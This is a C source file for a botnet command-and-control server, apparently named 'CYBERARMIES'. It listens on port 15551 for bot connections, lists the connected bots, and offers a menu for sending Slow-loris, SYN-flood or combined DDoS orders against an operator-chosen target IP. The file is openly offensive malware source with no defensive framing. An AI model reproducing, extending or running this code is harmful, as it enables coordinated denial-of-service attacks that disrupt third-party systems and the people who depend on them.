#include "conn_handler.h"

/* TODO: Make all the communications SSL encrypted.
 * 
 */

CONNS cons;
int msg_pipe[2];
pthread_t accept_thread;
int main_sock;

void start();

void init()
{
	main_sock = make_socket();
	bind_socket(main_sock, 15551, "0.0.0.0");
	listen(main_sock, 8);
	pipe(msg_pipe);
	pthread_create(&accept_thread, NULL, accept_handler, &main_sock);
	
}

void close_all()
{
	// Stop Receiving Connections by coonecting to the other thread.
	write(msg_pipe[1], "EXIT", 4);
	pthread_join(accept_thread, NULL);
	struct connections *connects = &cons;
	while(connects->next != NULL){
		// here sould have a protocol that will close the connection for a bot and cause it to stop running. 
		close_socket(connects->sock);
		printf("Connection Closed From : %s\n", inet_ntoa(connects->client_conn.sin_addr));
		connects = connects->next;
	}
}

void sig_handler(int signo)
{
  if (signo == SIGINT){
  	printf("[+] Stoping the current DDOS\n");
  	send_to_bots("[!DDOS!]");
  	signal(SIGINT, SIG_DFL); // returning control back to the computer's default.
  	start();
  }
}

void ddos()
{
	signal(SIGINT, sig_handler);

	const char ddos_options[] =
		"\033[0;33mDDos Options:\n"
		"\t[1] Slow-loris\n"
		"\t[2] Syn-Flood\n"
		"\t[3] All Types\n"
		"Select a number from above # : \033[0m";

	char reply[5];
	char target_ip[20];
	char max_threads[3];
	char max_forks[3];
	char type[14];
	char to_send[44];

	while(1){
		printf("%s", ddos_options);
		fgets(reply, 5, stdin);
		if(strncmp(reply, "1", 1) == 0){
			printf("[*] Selected DDos -> Slow-loris\n");
			strncpy(type, "SLOW-LORIS", 12);
		}else if(strncmp(reply, "2", 1) == 0){
			printf("[*] Selected DDos -> Syn-Flood\n");
			strncpy(type, "SYN-FLOOD", 12);
		}else if(strncmp(reply, "3", 1) == 0){
			printf("[*] Selected DDos -> All available Types\n");
			strncpy(type, "*", 2);
		}else if(strncmp(reply, "q", 1) == 0){
			printf("[+] Shutting down all services\n");
			close_all();
			exit(0);
		}else{
			printf("\033[0;31m[-] Wrong Choice!\033[0m\n");
			continue;
		}

		printf("\nTarget to DDos: ");
		fgets(target_ip, 19, stdin);
		target_ip[strlen(target_ip)-1] = '\x00';
		printf("Max Number of Threads: ");
		fgets(max_threads, 3, stdin);
		max_threads[strlen(max_threads)-1] = '\x00';
		printf("Max Number of Process: ");
		fgets(max_forks, 3, stdin);
		max_forks[strlen(max_forks)-1] = '\x00';

		printf("\n[*] Starting all The bots\n[i] ENTER Ctrl+C to quit current DDOS\n");
		
		sprintf(to_send, "%s %s %s %s", type, target_ip, max_threads, max_forks);
		printf("%s\n", to_send);
		send_to_bots(to_send);
		while(1){

		}
	}

}

void ls_all_bots()
{
	struct connections *connects = &cons;
	int i = 0;
	while(connects->next != NULL){
		printf("# %d Connection From => %s\n", i, inet_ntoa(connects->client_conn.sin_addr));
		i++;
		connects = connects->next;
	}
}

void start()
{
	char reply[5];
	const char main_options[] = 
	"Options:\n"
	"\t[1] DDos\n"
	"\t[2] List All the Bots\n"
	"Choose a # from the list: ";

	while(1){
		printf("%s", main_options);
		fgets(reply, 5, stdin);
		if (strncmp(reply, "1", 1) == 0){
			ddos();	
		}else if (strncmp(reply, "2", 1) == 0){
			ls_all_bots();
		}else if (strncmp(reply, "q", 1) == 0){
			printf("[+] Shutting down all services\n");
			close_all();
			break;
		}else{
			printf("\033[0;31m[-] Wrong Choice!\033[0m\n");
		}

	}

}

int main(int argc, char const *argv[])
{
	// Printing the Banner.
	srand(time(NULL));
	switch(rand()%5){
		case 0:
			printf("\033[0;31m");break;
		case 1:
			printf("\033[0;32m");break;
		case 2:
			printf("\033[0;34m");break;
		case 3:
			printf("\033[0;33m");break;
		case 4:
			printf("\033[0;35m");break;
	}
	printf(" ▄▄▄▄▄▄▄▄▄▄▄  ▄         ▄  ▄▄▄▄▄▄▄▄▄▄   ▄▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▄▄▄▄▄\n");
	printf("▐░░░░░░░░░░░▌▐░▌       ▐░▌▐░░░░░░░░░░▌ ▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌\n");
	printf("▐░█▀▀▀▀▀▀▀▀▀ ▐░▌       ▐░▌▐░█▀▀▀▀▀▀▀█░▌▐░█▀▀▀▀▀▀▀▀▀ ▐░█▀▀▀▀▀▀▀█░▌▐░█▀▀▀▀▀▀▀█░▌ ▀▀▀▀█░█▀▀▀▀ ▐░█▀▀▀▀▀▀▀▀▀ ▐░█▀▀▀▀▀▀▀▀▀ \n");
	printf("▐░▌          ▐░▌       ▐░▌▐░▌       ▐░▌▐░▌          ▐░▌       ▐░▌▐░▌       ▐░▌     ▐░▌     ▐░▌          ▐░▌          \n");
	printf("▐░▌          ▐░█▄▄▄▄▄▄▄█░▌▐░█▄▄▄▄▄▄▄█░▌▐░█▄▄▄▄▄▄▄▄▄ ▐░█▄▄▄▄▄▄▄█░▌▐░█▄▄▄▄▄▄▄█░▌     ▐░▌     ▐░█▄▄▄▄▄▄▄▄▄ ▐░█▄▄▄▄▄▄▄▄▄ \n");
	printf("▐░▌          ▐░░░░░░░░░░░▌▐░░░░░░░░░░▌ ▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌     ▐░▌     ▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌\n");
	printf("▐░▌           ▀▀▀▀█░█▀▀▀▀ ▐░█▀▀▀▀▀▀▀█░▌▐░█▀▀▀▀▀▀▀▀▀ ▐░█▀▀▀▀█░█▀▀ ▐░█▀▀▀▀█░█▀▀      ▐░▌     ▐░█▀▀▀▀▀▀▀▀▀  ▀▀▀▀▀▀▀▀▀█░▌\n");
	printf("▐░▌               ▐░▌     ▐░▌       ▐░▌▐░▌          ▐░▌     ▐░▌  ▐░▌     ▐░▌       ▐░▌     ▐░▌                    ▐░▌\n");
	printf("▐░█▄▄▄▄▄▄▄▄▄      ▐░▌     ▐░█▄▄▄▄▄▄▄█░▌▐░█▄▄▄▄▄▄▄▄▄ ▐░▌      ▐░▌ ▐░▌      ▐░▌  ▄▄▄▄█░█▄▄▄▄ ▐░█▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▄▄▄█░▌\n");
	printf("▐░░░░░░░░░░░▌     ▐░▌     ▐░░░░░░░░░░▌ ▐░░░░░░░░░░░▌▐░▌       ▐░▌▐░▌       ▐░▌▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌\n");
	printf(" ▀▀▀▀▀▀▀▀▀▀▀       ▀       ▀▀▀▀▀▀▀▀▀▀   ▀▀▀▀▀▀▀▀▀▀▀  ▀         ▀  ▀         ▀  ▀▀▀▀▀▀▀▀▀▀▀  ▀▀▀▀▀▀▀▀▀▀▀  ▀▀▀▀▀▀▀▀▀▀▀ \n");
	printf("\033[0m\n");

	printf("\033[0;32m[+] Initalizing the BotNet\033[0m\n");
	init();

	start();

	close(main_sock);

	return 0;
}